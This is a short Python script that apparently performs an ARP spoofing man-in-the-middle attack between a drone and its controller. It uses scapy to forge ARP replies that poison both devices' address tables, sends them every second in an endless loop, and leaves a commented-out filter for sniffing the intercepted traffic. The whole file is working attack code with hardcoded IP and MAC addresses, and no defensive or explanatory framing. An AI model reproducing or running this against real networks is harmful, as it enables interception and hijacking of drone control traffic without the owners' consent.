# Writer: Gal Harari
# Date: 23/05/2019$
from scapy.all import *
import signal
from scapy.layers.l2 import ARP
from scapy.layers.inet import IP, UDP, Ether
from get_control import get_mac


if __name__ == "__main__":
    my_mac = '00:f4:8d:ce:1a:61'

    handler_ip = '192.168.10.2'
    handler_mac = 'ec:d0:9f:fd:1b:25'
    drone_ip = '192.168.10.1'
    drone_mac = '60:60:1f:c4:3d:ba'
    print(get_mac(handler_ip))
    drone_base = Ether(dst=drone_mac)
    handler_base = Ether(dst=handler_mac)
	
    spoof_drone_pkt = drone_base / ARP(op=2, pdst=drone_ip,
                          psrc=handler_ip)
    spoof_handler_pkt = handler_base / ARP(op=2, pdst=handler_ip, psrc=drone_ip)

    while True:
        print("send arp")
        send(spoof_handler_pkt)
        send(spoof_drone_pkt)
        # sniff_filter = f"ip host {handler_ip}"

        time.sleep(1)
